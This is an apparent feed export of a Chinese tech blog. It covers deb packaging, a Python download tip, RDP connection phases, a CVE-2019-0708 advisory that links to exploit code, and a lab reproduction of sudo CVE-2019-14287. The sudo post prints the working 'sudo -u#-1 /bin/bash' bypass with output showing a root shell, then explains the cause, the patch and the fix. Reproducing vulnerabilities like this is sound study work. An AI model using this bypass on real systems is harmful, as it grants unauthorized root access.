    <content type="html"><![CDATA[<h2 id="将自己的软件打包成deb包"><a href="#将自己的软件打包成deb包" class="headerlink" title="将自己的软件打包成deb包"></a>将自己的软件打包成deb包</h2><h3 id="1-deb包的构成"><a href="#1-deb包的构成" class="headerlink" title="1.deb包的构成"></a>1.deb包的构成</h3><ul><li><p>数据包，你需要安装的程序数据;</p></li><li><p>安装信息及控制脚本包, 包含deb的安装说明，标识;</p></li><li><p>deb文件的一些二进制数据，包括文件头等信息。</p></li></ul><h3 id="2-创建工作目录"><a href="#2-创建工作目录" class="headerlink" title="2.创建工作目录"></a>2.创建工作目录</h3><p>这里以~/work 为工作目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$mkdir</span> work</span><br><span class="line"><span class="variable">$cd</span> work</span><br></pre></td></tr></table></figure><h3 id="3-描述文件和控制脚本"><a href="#3-描述文件和控制脚本" class="headerlink" title="3.描述文件和控制脚本"></a>3.描述文件和控制脚本</h3><p>工作目录下的文件树如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.                                                       </span><br><span class="line">├── DEBIAN</span><br><span class="line">│   ├── control</span><br><span class="line">│   ├── preinst</span><br><span class="line">│   ├── postinst</span><br><span class="line">│   ├── prerm</span><br><span class="line">│   └── postrm</span><br><span class="line">└── 模拟根目录</span><br></pre></td></tr></table></figure><p>control文件时程序的描述信息，剩下的四个文件时相关的控制脚本。</p><table><thead><tr><th align="center">文件</th><th align="center">运行时机</th></tr></thead><tbody><tr><td align="center">preinst</td><td align="center">解包数据包前运行的脚本</td></tr><tr><td align="center">postinst</td><td align="center">解包数据包后运行的脚本</td></tr><tr><td align="center">prerm</td><td align="center">卸载时，在删除文件前运行的脚本</td></tr><tr><td align="center">postrm</td><td align="center">删除文件后运行的脚本</td></tr></tbody></table><p>四个控制脚本不是必须的，但是control文件是必须存在的。<br>这里给出一个control文件的例子</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Package: soft</span><br><span class="line">Version: 1.0.1</span><br><span class="line">Section: utils</span><br><span class="line">Priority: optional</span><br><span class="line">Architecture: i386</span><br><span class="line">Depends:</span><br><span class="line">Installed-Size: 512</span><br><span class="line">Maintainer: xxx@xxx.com</span><br><span class="line">Description: soft package</span><br></pre></td></tr></table></figure><p>字段解释：</p><table><thead><tr><th align="left">字段</th><th align="left">意义</th></tr></thead><tbody><tr><td align="left">Package</td><td align="left">指该软件包的名字。如果你的软件包名称有两个词，用一个连字符（-）把它们连起来。软件包的名称只能有小写的英文字母，数字以及”+”和”-“。</td></tr><tr><td align="left">Version</td><td align="left">显然是程序的版本。这里的值不包括连字符。</td></tr><tr><td align="left">Section</td><td align="left">列出了你的软件属于的类别，可能的值包括admin（管理），games（游戏），gnome，kde，mail（电子邮件），misc（杂项，miscellaneous），net（网络），sound（声音），text（文本），utils（实用工具）和web（万维网）。</td></tr><tr><td align="left">Priority</td><td align="left">声明这个包的优先级（大部分的时候使用optional（可选的））。</td></tr><tr><td align="left">Architecture</td><td align="left">是该程序可运行的CPU架构（可能的值为i386，amd64和powerpc，大小写敏感。</td></tr><tr><td align="left">Eseential</td><td align="left">指该软件包是否是必须的（大部分的时候不是）。</td></tr><tr><td align="left">Depends</td><td align="left">这个程序的依赖程序。</td></tr><tr><td align="left">Recommends</td><td align="left">推荐安装的程序，一般都要装。</td></tr><tr><td align="left">Suggests</td><td align="left">建议安装，可能给这个软件带来更多功能，但是不安装也行</td></tr><tr><td align="left">Install-Size</td><td align="left">程序安装后的大小，按KB算。</td></tr><tr><td align="left">Maintainer</td><td align="left">维护者（写上你的名字，后面的方括号”[ ]”里留下你的电子邮件地址）。</td></tr><tr><td align="left">Conflicts</td><td align="left">表示跟这个程序冲突的软件。</td></tr><tr><td align="left">Replaces</td><td align="left">表明哪些软件包将被这个程序取代。</td></tr><tr><td align="left">Description</td><td align="left">显示你的描述。</td></tr></tbody></table><ul><li>依赖包的表示<br>  用英文的半角逗号分开不同的依赖关系(,)。如果两个软件中的任何一个可以工作，用竖线”|”分开它们。你也可以指定特定的版本，用在括号里用&lt;&lt;（小于），&lt;=（小于或等于），=（等于），&gt;=（大于或等于），或&gt;&gt;（大于）来表示。</li></ul><h3 id="4-需要安装的文件"><a href="#4-需要安装的文件" class="headerlink" title="4.需要安装的文件"></a>4.需要安装的文件</h3><p>准备好描述文件和相关的脚本后，就可以将你的程序放在模拟根目录下。<br>比如有一个soft.out文件。<br>安装到/user/local/bin目录下，那么在work目录下创建user/local/bin。<br>把soft.out放到~/work/user/local/bin下。<br>这个就是模拟根目录的意义。</p><p>文件放置妥当后的目录结构</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── DEBIAN</span><br><span class="line">│   └── control                                                              </span><br><span class="line">└── usr</span><br><span class="line">    └── local</span><br><span class="line">        └── bin</span><br><span class="line">            └── soft.out</span><br></pre></td></tr></table></figure><h3 id="5-打包"><a href="#5-打包" class="headerlink" title="5.打包"></a>5.打包</h3><p>在work目录下执行以下指令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$dpkg</span> -b ./ ~/soft.deb</span><br></pre></td></tr></table></figure><p>即可完成打包。</p><h3 id="相关的dpkg命令"><a href="#相关的dpkg命令" class="headerlink" title="*相关的dpkg命令"></a>*相关的dpkg命令</h3><p>安装前查看包内数据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$dpkg</span> -c debname</span><br></pre></td></tr></table></figure><p>安装deb包</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$dpkg</span> -i debname</span><br></pre></td></tr></table></figure><p>卸载deb包</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$dpkg</span> -r debname</span><br></pre></td></tr></table></figure><p>查看某文件属于哪个包</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$dpkg</span> -S filename</span><br></pre></td></tr></table></figure><p>释放数据到某个文件下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$dpkg</span> -X debname dirname</span><br></pre></td></tr></table></figure><p>释放控制信息到当前的DEBIAN目录下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$dpkg</span> -e debname</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;将自己的软件打包成deb包&quot;&gt;&lt;a href=&quot;#将自己的软件打包成deb包&quot; class=&quot;headerlink&quot; title=&quot;将自己的软件打包成deb包&quot;&gt;&lt;/a&gt;将自己的软件打包成deb包&lt;/h2&gt;&lt;h3 id=&quot;1-deb包的构成&quot;&gt;&lt;a href=&quot;#
      
    
    </summary>
    
    
      <category term="Linux" scheme="http://yoursite.com/categories/Linux/"/>
    
    
      <category term="linux" scheme="http://yoursite.com/tags/linux/"/>
    
      <category term="Ubuntu" scheme="http://yoursite.com/tags/Ubuntu/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2019-14287复现</title>
    <link href="http://yoursite.com/post/13cae37e.html"/>
    <id>http://yoursite.com/post/13cae37e.html</id>
    <published>2019-10-31T06:35:48.000Z</published>
    <updated>2019-10-31T10:29:57.006Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-CVE-2019-14287权限提升漏洞"><a href="#1-CVE-2019-14287权限提升漏洞" class="headerlink" title="1.CVE-2019-14287权限提升漏洞"></a>1.CVE-2019-14287权限提升漏洞</h2><p>2019年10月14日， sudo 官方在发布了 CVE-2019-14287 的漏洞预警。<br>sudo大家都熟悉，基本上所有 unix操作系统(BSD, MacOS, GNU/Linux) 都会集成的一个用户权限控制/切换程序。允许管理员控制服务器下用户能够切换的用户权限。<br>CVE-2019-14287 是管理员在配置文件中用了 ALL 关键词后造成的。但默认的 sudo 配置文件不受影响。</p><h2 id="2-复现"><a href="#2-复现" class="headerlink" title="2.复现"></a>2.复现</h2><p>靶机:Ubuntu16.04<br>首先我们先查看一下Ubuntu的sudo版本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sudo</span> -V</span><br><span class="line">Sudo 版本 1.8.16</span><br><span class="line">Sudoers 策略插件版本 1.8.16</span><br><span class="line">Sudoers 文件语法版本 45</span><br><span class="line">Sudoers I/O plugin version 1.8.16</span><br></pre></td></tr></table></figure><p>sudo版本小于1.8.28<br>首先我们先创建一个账号。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$useradd</span> cvetest</span><br><span class="line"><span class="variable">$passwd</span> cvetest</span><br><span class="line">输入新的 UNIX 密码： </span><br><span class="line">重新输入新的 UNIX 密码： </span><br><span class="line">passwd：已成功更新密码</span><br></pre></td></tr></table></figure><p>通过编辑/etc/sudoers，给予它受限的权利。<br>在/etc/sudoers中添加</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cvetest ALL=(ALL,!root) /bin/bash</span><br></pre></td></tr></table></figure><p>这个的意思是，cvetest可以用root以外的权限执行/bin/bash<br>现在我们切换到cvetest用户看看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$su</span> cvetest</span><br><span class="line">密码:</span><br></pre></td></tr></table></figure><p>首先尝试以root权限执行/bin/bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sudo</span> -u root /bin/bash</span><br><span class="line">[sudo] cvetest 的密码： </span><br><span class="line">对不起，用户 cvetest 无权以 root 的身份在 ubuntu 上执行 /bin/bash。</span><br></pre></td></tr></table></figure><p>这说明了cvetest权限受限了<br>但是当我们换一种方法，用下列指令执行时，却可以以root权限执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sudo</span> -u<span class="comment">#-1 /bin/bash </span></span><br><span class="line">sudo: 未知用户：<span class="comment">#-1</span></span><br><span class="line">sudo: 无法初始化策略插件</span><br><span class="line"></span><br><span class="line"><span class="variable">$sudo</span> -u<span class="comment">#4294967295 /bin/bash</span></span><br><span class="line">sudo: 未知用户：<span class="comment">#4294967295</span></span><br><span class="line">sudo: 无法初始化策略插件</span><br></pre></td></tr></table></figure><p>???????<br>翻车了。<br>居然在Ubuntu上无法复现。。。。。。</p><p>更换到Centos7再试试<br>首先</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sudo</span> -V</span><br><span class="line">Sudo 版本 1.8.23</span><br><span class="line">Sudoers 策略插件版本 1.8.23</span><br><span class="line">Sudoers 文件语法版本 46</span><br></pre></td></tr></table></figure><p>其实centos上输出了一大堆东西，这里我就只选择了一部分来显示。<br>继续上面的操作。<br>创建用户修改权限如上所示。</p><p>以root权限执行/bin/bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sudo</span> -u root /bin/bash</span><br><span class="line"></span><br><span class="line">我们信任您已经从系统管理员那里了解了日常注意事项。</span><br><span class="line">总结起来无外乎这三点：</span><br><span class="line"></span><br><span class="line">    <span class="comment">#1) 尊重别人的隐私。</span></span><br><span class="line">    <span class="comment">#2) 输入前要先考虑(后果和风险)。</span></span><br><span class="line">    <span class="comment">#3) 权力越大，责任越大。</span></span><br><span class="line"></span><br><span class="line">[sudo] cvetest 的密码：</span><br><span class="line">对不起，用户 cvetest 无权以 root 的身份在 centos7 上执行 /bin/bash。</span><br></pre></td></tr></table></figure><p>权限不足，接下来我们准备提高权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[cvetest@centos7 /]$ sudo -u<span class="comment">#-1 /bin/bash</span></span><br><span class="line">[sudo] cvetest 的密码：</span><br><span class="line">bash-4.2<span class="comment"># exit</span></span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line">[cvetest@centos7 /]$ sudo -u<span class="comment">#4294967295 /bin/bash</span></span><br><span class="line">bash-4.2<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>成功，以受限制的cvetest拿到了root权限来执行/bin/bash</p><h2 id="3-原理解释"><a href="#3-原理解释" class="headerlink" title="3.原理解释"></a>3.原理解释</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sudo</span> -u<span class="comment">#userid</span></span><br></pre></td></tr></table></figure><p>这个指令表示的是以userid对应的用户来执行程序。<br>看到-1和4294967295相信大家都已经明白了，程序面对无法识别的特殊值的时候，会将其转换为0，然而0刚好表示root用户。<br>我推测流程大概是这样的：<br>sudo将无法识别的值误认为是0。<br>然后交给权限处理或者账号验证之类的模块时传输的还是-1之类的特殊值，因为权限里面设置了cvetest可以以非root的其余所有账号启动。<br>这些模块一看-1不是root的id，因此给予执行的权利，sudo一看管理权限的那些模块没有返回权限不足，看了看用户给的id，嗯是0，没问题，就允许cvetest以root权限执行/bin/bash了。</p><h2 id="4-原理验证"><a href="#4-原理验证" class="headerlink" title="4.原理验证"></a>4.原理验证</h2><p>根据我们的猜测，那么配置为</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cvetest ALL=(default,cvetest) /bin/bash</span><br></pre></td></tr></table></figure><p>即cvetest只能以default和cvetest执行/bin/bash时，应该时无法获取root权限。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[cvetest@centos7 /]$ sudo -u<span class="comment">#1000 /bin/bash</span></span><br><span class="line">[sudo] cvetest 的密码：</span><br><span class="line">[default@centos7 /]$ <span class="built_in">exit</span></span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line">[cvetest@centos7 /]$ sudo -u<span class="comment">#-1 /bin/bash</span></span><br><span class="line">对不起，用户 cvetest 无权以 <span class="comment">#-1 的身份在 centos7 上执行 /bin/bash。</span></span><br></pre></td></tr></table></figure><p>因为当管理权限的模块拿到uid为-1时，发现并不是default或者cvetest的id，因此不给权限。</p><p>当然最好的验证方式就是看源码的改动。因为这个漏洞在1.8.28中修复了，我们去看看了修改的日志还真找到了。<br><a href="https://www.sudo.ws/repos/sudo/rev/83db8dba09e7" target="_blank" rel="noopener">Treat an ID of -1 as invalid since that means “no change”.</a></p><p>可以看到sudo修改了lib/util/strtoid.c<br>加了一些代码。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">llval = strtoll(p, &amp;ep, <span class="number">10</span>);</span><br><span class="line">...</span><br><span class="line"><span class="comment">/* Disallow id -1, which means "no change". */</span></span><br><span class="line">    <span class="keyword">if</span> (!valid_separator(p, ep, sep) || llval == <span class="number">-1</span> || llval == (<span class="keyword">id_t</span>)UINT_MAX) &#123;</span><br><span class="line"><span class="keyword">if</span> (errstr != <span class="literal">NULL</span>)</span><br><span class="line">    *errstr = N_(<span class="string">"invalid value"</span>);</span><br><span class="line">errno = EINVAL;</span><br><span class="line"><span class="keyword">goto</span> done;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>更加深层次的分析可见<br><a href="https://paper.seebug.org/1057/" target="_blank" rel="noopener">CVE-2019-14287分析</a></p><h2 id="5-如何预防与修复"><a href="#5-如何预防与修复" class="headerlink" title="5.如何预防与修复"></a>5.如何预防与修复</h2><p>最简单的方法当然是直接将sudo升级到1.8.28以上，当然你也可以自己排除sudo的配置，打开/etc/sudoers,将其中设置了(ALL,!XXXX)即以非xxxx权限的，都修改掉。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;1-CVE-2019-14287权限提升漏洞&quot;&gt;&lt;a href=&quot;#1-CVE-2019-14287权限提升漏洞&quot; class=&quot;headerlink&quot; title=&quot;1.CVE-2019-14287权限提升漏洞&quot;&gt;&lt;/a&gt;1.CVE-2019-14287权限提升
      
    
    </summary>
    
    
      <category term="安全漏洞" scheme="http://yoursite.com/categories/%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/"/>
    
    
      <category term="linux" scheme="http://yoursite.com/tags/linux/"/>
    
      <category term="安全" scheme="http://yoursite.com/tags/%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>python urllib的urlretrieve下载太慢</title>
    <link href="http://yoursite.com/post/b1acc7fd.html"/>
    <id>http://yoursite.com/post/b1acc7fd.html</id>
    <published>2019-10-30T07:30:03.000Z</published>
    <updated>2019-10-31T10:29:57.007Z</updated>
    
    <content type="html"><![CDATA[<h2 id="urllib的urlretrieve方法下载太慢的解决方法"><a href="#urllib的urlretrieve方法下载太慢的解决方法" class="headerlink" title="urllib的urlretrieve方法下载太慢的解决方法"></a>urllib的urlretrieve方法下载太慢的解决方法</h2><p>今天尝试适应python的urllib下载文件，结果发现三线程居然总下载速度只有500kb/s，使用CMD的curl命令下载速度是这个的几倍，因此经过我的实验和查证，可以使用urlopen的方法来替代</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">resp = urllib.urlopen(URL)</span><br><span class="line">respHtml = resp.read()</span><br><span class="line">binfile = open(DownloadFilePath, <span class="string">"wb"</span>)</span><br><span class="line">binfile.write(respHtml)</span><br><span class="line">binfile.close()</span><br></pre></td></tr></table></figure><p>直接获取数据，二进制保存到文件，这样比直接使用urlretrieve快许多。<br>或者直接使用curl命令</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.system(<span class="string">'curl -o '</span> + DownloadFilePath + <span class="string">' '</span> + URL)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;urllib的urlretrieve方法下载太慢的解决方法&quot;&gt;&lt;a href=&quot;#urllib的urlretrieve方法下载太慢的解决方法&quot; class=&quot;headerlink&quot; title=&quot;urllib的urlretrieve方法下载太慢的解决方法&quot;&gt;&lt;/a
      
    
    </summary>
    
    
      <category term="python" scheme="http://yoursite.com/categories/python/"/>
    
    
      <category term="随手记录" scheme="http://yoursite.com/tags/%E9%9A%8F%E6%89%8B%E8%AE%B0%E5%BD%95/"/>
    
      <category term="python" scheme="http://yoursite.com/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>RDP建立过程</title>
    <link href="http://yoursite.com/post/1e6d0424.html"/>
    <id>http://yoursite.com/post/1e6d0424.html</id>
    <published>2019-10-18T07:26:13.000Z</published>
    <updated>2019-10-18T07:26:13.819Z</updated>
    
    <content type="html"><![CDATA[<h2 id="RDP协议的官方文档"><a href="#RDP协议的官方文档" class="headerlink" title="RDP协议的官方文档"></a>RDP协议的官方文档</h2><p><a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rdpbcgr/5073f4ed-1e93-45e1-b039-6e30c385867c" target="_blank" rel="noopener">[MS-RDPBCGR]: Remote Desktop Protocol: Basic Connectivity and Graphics Remoting</a></p><p>接下来的内容都是基于此协议</p><h2 id="RDP时序图"><a href="#RDP时序图" class="headerlink" title="RDP时序图"></a>RDP时序图</h2><hr><p><img src="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rdpbcgr/ms-rdpbcgr_files/image001.png" alt="RDP时序图"></p><h2 id="连接的十个阶段"><a href="#连接的十个阶段" class="headerlink" title="连接的十个阶段"></a>连接的十个阶段</h2><hr><h3 id="1-Connection-Initiation"><a href="#1-Connection-Initiation" class="headerlink" title="1.Connection Initiation"></a>1.Connection Initiation</h3><p>客户机向服务发送等级0的x.224的连接请求，服务器回应。此后客户机和服务器的所有数据都要包装在x.224的PDU里面</p><h3 id="2-Basic-Settings-Exchange"><a href="#2-Basic-Settings-Exchange" class="headerlink" title="2.Basic Settings Exchange"></a>2.Basic Settings Exchange</h3><p>这个阶段客户机与服务器进行基础设置的交换（比如核心数据、安全数据、网络数据库），客户机发送MCS连接初始化PDU，服务器返回MCS连接响应PDU。连接初始化PDU带有通用会议控制（Generic Conference Control ，GCC）的会议创建请求，连接回应PDU则带有GCC的会议创建回应。</p><p><img src="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rdpbcgr/ms-rdpbcgr_files/image002.png" alt="MCS连接初始化"></p><p><img src="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rdpbcgr/ms-rdpbcgr_files/image003.png" alt="MCS连接回应"></p><h3 id="3-Channel-Connection"><a href="#3-Channel-Connection" class="headerlink" title="3.Channel Connection"></a>3.Channel Connection</h3><p>客户机先发送MCS建立域请求PDU再发送MCS附加到用户请求PDU，以此讲主用户标识附加到MCS域。服务器收到后会回复MCS附加用户PDU，其中包含着用户通道ID。</p><p>然后，客户端通过使用多个MCS通道连接请求PDU连接用户通道、输入/输出(I/O)通道和所有静态虚拟通道(I/O和静态虚拟通道id来自嵌入在GCC包中的数据)。</p><p>服务端会对每一个通道连接请求发送一个MCS通道连接确认PDU。（RDP 4.0, 5.0, 5.1, 5.2, 6.0, 6.1, 7.0, 7.1, 8.0, 10.2, 10.3, 10.4, 10.5只能在收到上一个通道连接的确认后才能发下一个，RDP 8.1, 10.0, 10.1可以一次性全部发送连接请求）</p><p>从这之后客户机发送的数据都要包装在MCS发送数据请求PDU中，服务器返回的数据都要包装在MCS发送数据指示PDU中。</p><h3 id="4-RDP-Security-Commencement"><a href="#4-RDP-Security-Commencement" class="headerlink" title="4.RDP Security Commencement"></a>4.RDP Security Commencement</h3><p>如果使用了标准RDP安全机制，并且加密生效的情况下（这个你可以通过服务器在Basic Settings Exchange阶段中的返回数据中知道）。<br>客户机需要向服务器发送一个包含由服务器给出的公钥加密过的32字节随机数的安全交换PDU。（公钥在Basic Settings Exchange阶段中的返回数据中可以找到）<br>客户机和服务器将通过这32字节的随机数生成会话密钥，以后的PDU将用此来进行加密和验证完整性。</p><p>从这里开始后续的RDP数据都可以加密</p><h3 id="5-Secure-Settings-Exchange"><a href="#5-Secure-Settings-Exchange" class="headerlink" title="5.Secure Settings Exchange"></a>5.Secure Settings Exchange</h3><p>一些敏感数据比如（用户名，密码，重新连接的cookie）将通过用户信息PDU发送到服务器上</p><h3 id="6-Optional-Connect-Time-Auto-Detection"><a href="#6-Optional-Connect-Time-Auto-Detection" class="headerlink" title="6.Optional Connect-Time Auto-Detection"></a>6.Optional Connect-Time Auto-Detection</h3><p>可选的检测阶段，用于确定双发间网络的时延和带宽。</p><h3 id="7-Licensing"><a href="#7-Licensing" class="headerlink" title="7.Licensing"></a>7.Licensing</h3><p>服务器向客户机传输许可证，客户机保存后，在随后连接中将许可证发送到服务器来验证，本文默认服务器不会向客户机发送许可。</p><h3 id="8-Optional-Multitransport-Bootstrapping"><a href="#8-Optional-Multitransport-Bootstrapping" class="headerlink" title="8.Optional Multitransport Bootstrapping"></a>8.Optional Multitransport Bootstrapping</h3><p>服务器可以选择进行多重传输连接</p><h3 id="9-Capabilities-Exchange"><a href="#9-Capabilities-Exchange" class="headerlink" title="9.Capabilities Exchange"></a>9.Capabilities Exchange</h3><p>这个阶段服务器会通过需求活动PDU发送自己支持的功能集，随后会发送监视器布局PDU（可选）。客户机需要返回确认活动PDU</p><h3 id="10-Connection-Finalization"><a href="#10-Connection-Finalization" class="headerlink" title="10.Connection Finalization"></a>10.Connection Finalization</h3><p>服务器和客户机互相发送数据来确定连接的细节，没有严格要求相互间必须同步，发送的包按顺序发送即可，即客户机和服务端异步按顺序发送连接的信息。</p><p>客户机在阶段9发送了确认活动PDU后就开始发送鼠标键盘的输入，服务端在收到字体列表的PDU后就可以发送图像输出。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;RDP协议的官方文档&quot;&gt;&lt;a href=&quot;#RDP协议的官方文档&quot; class=&quot;headerlink&quot; title=&quot;RDP协议的官方文档&quot;&gt;&lt;/a&gt;RDP协议的官方文档&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://docs.microsoft.com/en
      
    
    </summary>
    
    
      <category term="安全漏洞" scheme="http://yoursite.com/categories/%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/"/>
    
    
      <category term="安全" scheme="http://yoursite.com/tags/%E5%AE%89%E5%85%A8/"/>
    
      <category term="windows" scheme="http://yoursite.com/tags/windows/"/>
    
      <category term="rdp" scheme="http://yoursite.com/tags/rdp/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2019-0708</title>
    <link href="http://yoursite.com/post/24c02121.html"/>
    <id>http://yoursite.com/post/24c02121.html</id>
    <published>2019-10-18T07:25:47.000Z</published>
    <updated>2019-11-07T01:50:23.164Z</updated>
    
    <content type="html"><![CDATA[<h2 id="CVE-2019-0708"><a href="#CVE-2019-0708" class="headerlink" title="CVE-2019-0708"></a>CVE-2019-0708</h2><p>CVE-2019-0708是微软于5月14日公布的一个远程桌面服务的远程代码执行漏洞(CVE-2019-0708)，利用此漏洞可以直接获取windows服务器的权限。<br>现在网上已经有安全研究人员披露该漏洞远程crash PoC，对于某些系统已经能获取shell执行命令了。</p><h2 id="影响系统"><a href="#影响系统" class="headerlink" title="影响系统"></a>影响系统</h2><ul><li>Windows 2003</li><li>Windows XP</li><li>Windows Vista</li><li>Windows 7</li><li>Windows Server 2008</li><li>Windows Server 2008 R2</li></ul><h2 id="防范方法"><a href="#防范方法" class="headerlink" title="防范方法"></a>防范方法</h2><h3 id="下载相关补丁"><a href="#下载相关补丁" class="headerlink" title="下载相关补丁"></a>下载相关补丁</h3><p><a href="https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-0708" target="_blank" rel="noopener">windows7和windows server 08补丁下载</a><br><a href="https://support.microsoft.com/en-us/help/4500705/customer-guidance-for-cve-2019-0708" target="_blank" rel="noopener">windows xp和windows sever 03补丁下载</a></p><h3 id="开启NLP"><a href="#开启NLP" class="headerlink" title="开启NLP"></a>开启NLP</h3><p>打开 控制面板\所有控制面板项\系统，点开右侧的远程设置，在远程桌面项中切换为 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">仅允许运行使用网络级别身份验证的远程桌面的计算机连接（更安全）（N）</span><br></pre></td></tr></table></figure><p>一般为第三项</p><h2 id="相关利用方法"><a href="#相关利用方法" class="headerlink" title="相关利用方法"></a>相关利用方法</h2><p><a href="https://github.com/rapid7/metasploit-framework/pull/12283" target="_blank" rel="noopener">cve-2019-0708的POC和EXP</a></p><ul><li>新增<br><a href="https://github.com/coolboy4me/cve-2019-0708_bluekeep_rce" target="_blank" rel="noopener">xp的利用方法</a></li></ul><h2 id="后言"><a href="#后言" class="headerlink" title="后言"></a>后言</h2><p>下篇文章讲讲一下rdp协议的一些知识<br><a href="https://doasromansdo.github.io/post/1e6d0424.html#more" target="_blank" rel="noopener">rpd的连接过程</a></p>]]></content>
    
    <summary type="html">
    
      
      
